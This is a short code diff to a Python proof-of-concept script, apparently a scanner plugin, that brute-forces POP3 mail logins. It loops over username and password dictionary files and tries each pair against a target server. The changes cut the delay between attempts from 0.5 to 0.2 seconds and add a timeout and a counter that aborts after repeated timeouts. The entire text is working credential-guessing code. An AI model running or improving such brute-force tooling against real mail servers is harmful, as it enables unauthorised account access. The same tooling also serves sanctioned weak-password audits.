@@ -19,6 +19,7 @@ class POC(Script):
 
     def prove(self):
         if _socket_connect(self.target_host, self.target_port):
+            flag = 3
             usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else  self.read_file('dict/pop3_usernames.txt')
             passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else  self.read_file('dict/pop3_passwords.txt')
             for linef1 in usernamedic:
@@ -30,7 +31,8 @@ class POC(Script):
                 for linef2 in passworddic:
                     password = linef2.replace("%user%", username).strip('\r').strip('\n').replace("@%host%", '')
                     try:
-                        time.sleep(0.5)
+                        time.sleep(0.2)
+                        socket.setdefaulttimeout(3)
                         pop = poplib.POP3(self.target_host, self.target_port)
                         pop.user(username1)
                         auth = pop.pass_(password)
@@ -47,7 +49,10 @@ class POC(Script):
                         pop.quit()
                         break
                     except Exception as e:
-                        pass
+                        if "timed out" in str(e):
+                            if flag == 0 :
+                                return
+                            flag -= 1
 
 def _socket_connect(ip, port,msg = "test"):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
